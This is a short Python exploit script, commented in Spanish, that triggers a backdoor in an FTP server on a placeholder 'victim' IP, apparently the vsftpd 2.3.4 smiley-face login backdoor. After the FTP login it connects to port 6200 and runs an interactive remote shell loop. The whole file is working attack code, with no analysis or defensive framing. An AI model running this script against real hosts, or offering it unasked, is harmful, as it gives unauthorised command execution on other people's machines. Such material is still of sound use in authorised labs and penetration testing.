import socket

VICTIMA_IP = 'IP_PUBLICA_DE_LA_VICTIMA'
FTP_PORT = 21

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((VICTIMA_IP, FTP_PORT))
    print(s.recv(1024).decode())

    s.send(b'USER ftpd:)\r\n')
    print(s.recv(1024).decode())
    
    s.send(b'PASS password\r\n')
    print(s.recv(1024).decode())
    s.close()

    print("[*] Backdoor activada. Intentando conectar al puerto 6200...")

    shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    shell_socket.connect((VICTIMA_IP, 6200))
    print("[+] Shell remota obtenida. Escribe comandos:")
    
    while True:
        command = input("shell> ")
        if command.lower() == 'exit':
            break
        
        shell_socket.send(command.encode() + b'\n')
        response = shell_socket.recv(4096).decode()
        print(response)

    shell_socket.close()

except ConnectionRefusedError:
    print("[!] Conexión rechazada. ¿Está el puerto 21 abierto y redirigido?")
except Exception as e:
    print(f"[!] Ocurrió un error: {e}")
